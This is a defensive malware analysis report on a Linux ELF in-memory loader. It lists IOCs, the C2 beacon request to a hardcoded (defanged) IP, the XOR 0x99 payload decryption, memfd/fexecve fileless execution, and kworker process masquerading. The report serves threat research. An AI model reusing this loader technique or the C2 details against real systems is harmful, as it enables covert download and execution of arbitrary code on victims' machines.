---
title: "Malicious sample analysis: Linux/MemfdLoader.WS (ELF · elf · d84608b3)"
published: 2026-11-26
draft: false
description: "Malicious (confidence: low): Linux/MemfdLoader.WS · loader/downloader · difficulty medium · dynamic sandbox + static decompilation"
tags: ["loader", "downloader", "ELF"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-26-Linux-MemfdLoader.WS-d84608b3"
---

> [!WARNING]
> **Verdict: malicious** · Family **Linux/MemfdLoader.WS** (unconfirmed) · Confidence **low**
> 
> Aliases: linux_i386_ws loader, ws_/l32 HTTP beacon in-memory loader
> 
> This file is a 32-bit x86 Linux ELF in-memory loader/downloader: after startup it checks the single-instance marker /tmp/log_de.log, repeatedly establishes TCP connections to the hardcoded address 47.107.122[.]241:40002 and sends an HTTP beacon disguised as Firefox, then reads the HTTP response, decrypts the response body byte by byte with XOR 0x99 and writes it into a memfd, and then uses fexecve to execute the second stage filelessly under the process name [kworker/0:2]. Decompilation and disassembly fully recovered this execution chain, and the real run inside the hardened instance also observed the marker-file probe and repeated connection attempts to 47.107.122[.]241:40002.

## Quick Overview

| Item | Content |
|:--|:--|
| Family | **Linux/MemfdLoader.WS** · Aliases linux_i386_ws loader, ws_/l32 HTTP beacon in-memory loader · _unconfirmed_ |
| Confidence | **low** |
| Behavior class | loader · downloader |
| Difficulty | medium |
| First seen | 2026-11-24 01:05:32 |
| Analysis method | Dynamic sandbox analysis (Linux sample) + static decompilation |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/d84608b3e154142cdb626876c3ea8948225786ebe2c7791509a2253d7009cf0c/) |

## Attack Chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="34" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Checks single-instance marker</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1480</text>
<rect x="586" y="23" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="38" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">Dynamic</text>
<circle cx="26" cy="84" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="84" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Connects back to hardcoded C2</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<rect x="586" y="73" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="88" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">Dynamic</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Sends fake-browser beacon</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Reads response header boundary</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">XOR 0x99 decrypts payload</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1140</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
</svg>

## Sample Identification

| Item | Value |
|:--|:--|
| SHA-256 | `d84608b3e154142cdb626876c3ea8948225786ebe2c7791509a2253d7009cf0c` |
| MD5 | _Not recorded_ |
| Size | 7,262 bytes (7.1 KB) |
| Type | ELF · `elf` |

## Behavior Analysis

There are **7** behaviors in total, each backed by evidence; **5** are statically available and **2** were obtained through dynamic analysis.

### 1. Checks single-instance marker

`T1480` · Confidence **high** · Dynamic

It calls access("/tmp/log_de.log", F_OK); if the path already exists it exits directly with exit(0), to avoid repeated execution on the same host.

> **Evidence**: 0x08048707 call access, path 0x08048ae0="/tmp/log_de.log"; dynamic observation of access("/tmp/log_de.log", F_OK) returning ENOENT.
> 
> **Source**: `ev-000002` · `ev-000010` · `ref:a81b35b734`

### 2. Connects back to hardcoded C2

`T1071.001` · Confidence **high** · Dynamic

It creates an AF_INET/SOCK_STREAM socket and sets TCP_SYNCNT=10, then connects to 47.107.122[.]241:40002; on connection failure it sleeps(10) and retries indefinitely.

> **Evidence**: 0x0804873d writes port 0x429c(40002), 0x08048746 gethostbyname, 0x08048784 socket, 0x080487b1 setsockopt, 0x080487be connect; dynamic observation of connect(3, {sin_port=htons(40002), sin_addr=47.107.122[.]241}) returning ENETUNREACH repeatedly and entering a 10-second sleep.
> 
> **Source**: `ev-000002` · `ev-000015` · `ev-000016` · `ev-000017` · `ref:c7bbb8697d`

### 3. Sends fake-browser beacon

`T1071.001` · Confidence **high** · Static

After a successful connection it uses sprintf to build "GET /?a=l32&h=47.107.122[.]241&t=ws_&p=40002 HTTP/1.1", with Host and a Firefox/48.0 User-Agent, and sends 0x400 bytes reporting the host identifier and port.

> **Evidence**: 0x08048808 call sprintf, format string 0x08048b19, arguments 0x08048b15="l32", 0x08048af0="47.107.122[.]241", 0x08048b11="ws_"; 0x0804881b call send.
> 
> **Source**: `ev-000002` · `ev-000001` · `ref:c7bbb8697d`

### 4. Reads response header boundary

`T1071.001` · Confidence **high** · Static

It calls recv byte by byte until it recognizes the \r\n\r\n header terminator sequence, thereby separating the HTTP response headers from the following binary payload body.

> **Evidence**: 0x0804883a call recv, from 0x0804888a compares the 0x0a/0x0d four-byte sequence to determine the end of the message header.
> 
> **Source**: `ev-000002` · `ref:c7bbb8697d`

### 5. XOR 0x99 decrypts payload

`T1140` · Confidence **high** · Static

For each data block received by recv it XORs every byte with 0x99 before writing it out, a lightweight obfuscation layer for the second-stage payload.

> **Evidence**: 0x080488c2 instruction 80 34 0a 99 (xor byte ptr [edx+ecx], 0x99), loop length is the return value of this recv.
> 
> **Source**: `ev-000002` · `ref:a81b35b734`

### 6. Fileless execution via memfd

`T1620` · Confidence **high** · Static

With syscall 356 (i386 memfd_create) it creates an in-memory file named "a" with MFD_CLOEXEC, writes the decrypted payload into that fd, and finally calls fexecve to execute it directly from memory, avoiding touching disk.

> **Evidence**: 0x0804887a push 0x164, 0x0804887d push "a"(0x08048b9c), 0x08048887 call syscall; 0x080488d5 write; 0x08048944 call fexecve.
> 
> **Source**: `ev-000002` · `ref:a81b35b734`

### 7. Masquerades as a kernel thread name

`T1036.005` · Confidence **high** · Static

Before execution it sets argv[0] to "[kworker/0:2]" and setenv("CWD", realpath(argv[0]), 1), making the second stage appear in the process list as a kernel worker thread.

> **Evidence**: 0x08048930 writes argv[0]=0x08048ba2="[kworker/0:2]", 0x080488fa realpath, 0x0804891a setenv("CWD",...) (key 0x08048b9e).
> 
> **Source**: `ev-000002` · `ref:a81b35b734`


## IOCs (defanged)

### Network

:::caution
**Pending dynamic verification**: The above addresses come from static analysis; no successful connection or session was observed in the network-isolated analysis environment, and the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://47[.]107[.]122[.]241:40002/` | 40002 | c2 | Static | ⏳ Not observed |

### Host

**Drop paths**

- `/tmp/log_de.log`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `47.107.122[.]241` | Yes | Static |
| `c2_port` | `40002` | Yes | Static |
| `c2_uri` | `GET /?a=l32&h=<host>&t=ws_&p=<port> HTTP/1.1` | Yes | Static |
| `user_agent` | `Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0` | Yes | Static |
| `marker_path` | `/tmp/log_de.log` | Yes | Static |
| `payload_xor_key` | `0x99` | Yes | Static |
| `memfd_name` | `a` | Yes | Static |
| `exec_argv0` | `[kworker/0:2]` | Yes | Static |

## Do Not Misjudge

:::important
The following conclusions are **easy to misjudge**; please note them when citing this report.

- Do not assert that the final payload is ransomware, a miner or DDoS: the second stage was not obtained this time; it can only be confirmed that the loader downloads and executes arbitrary payloads in memory.
- Do not claim that a C2 session was established or remote commands were received: within the analysis window there were only connect attempts rejected by network isolation, with no request/response session.
- Do not claim that the sample uses strong encryption such as AES/RSA: the payload only undergoes single-byte XOR 0x99.
- Do not claim Windows registry, service or scheduled-task persistence: the sample is a Linux ELF and implements no such behavior.
:::

## Analysis Method and Limitations

| Item | Content |
|:--|:--|
| Analysis method | Dynamic sandbox analysis (Linux sample) + static decompilation |
| Unpacking | No |

**Limitations and pending verification**

1. The analysis environment has no external network and all C2 connections were rejected, so no HTTP response and no second-stage sample were obtained; the XOR decryption, memfd write and fexecve execution path were confirmed statically by decompilation/disassembly and were not dynamically verified end to end.
2. Although the C2 fields have real connect events, there was no successful session, so they are treated as statically recovered and marked pending dynamic verification.
3. The sample is a 32-bit i386 ELF and depends on /lib/ld-linux.so.2; behavior on hosts of other architectures was not verified.
4. The runtime environment lacked /etc/resolv.conf, so gethostbyname resolution failed and fell back to inet_addr; therefore only the IP-form C2 was confirmed, and a same-origin domain cannot be ruled out.
5. The single-instance marker /tmp/log_de.log was only checked for existence and was not created by the sample itself, presumably created by the second stage or the delivery chain.

## Evidence Index

<details>
<summary>Expand 8 tool evidence entries</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ev-000001` | String extraction | Extracted 122 ASCII strings, locating the C2 IP, HTTP beacon format, User-Agent, marker path, memfd name and masqueraded process name. |
| `ev-000002` | decompile.ghidra | Decompiled main (0x080486e0), fully recovering the single-instance check, C2 connection, beacon, XOR decryption and memfd/fexecve execution chain. |
| `ev-000010` | dyn.trace.strace | Dynamic observation of access("/tmp/log_de.log", F_OK) returning ENOENT. |
| `ev-000015` | dyn.trace.strace | Dynamic observation of socket(AF_INET, SOCK_STREAM, IPPROTO_IP) being created successfully. |
| `ev-000016` | dyn.trace.strace | Dynamic observation of connect to 47.107.122[.]241:40002 returning ENETUNREACH, followed by a 10-second sleep and retry. |
| `ev-000017` | dyn.trace.strace | Dynamic observation of the second connect to 47.107.122[.]241:40002 still returning ENETUNREACH. |
| `ref:c7bbb8697d` | disasm.function | main disassembly: access/gethostbyname/socket/setsockopt/connect/sprintf/send/recv call sites and constant 0x429c. |
| `ref:a81b35b734` | disasm.function | Second half of main disassembly: syscall 0x164 (memfd_create), XOR 0x99 loop, write, realpath/setenv, argv[0]=[kworker/0:2], fexecve. |

</details>

---

_The sample in this report is not public, IOCs have been defanged, and this is for security research only._
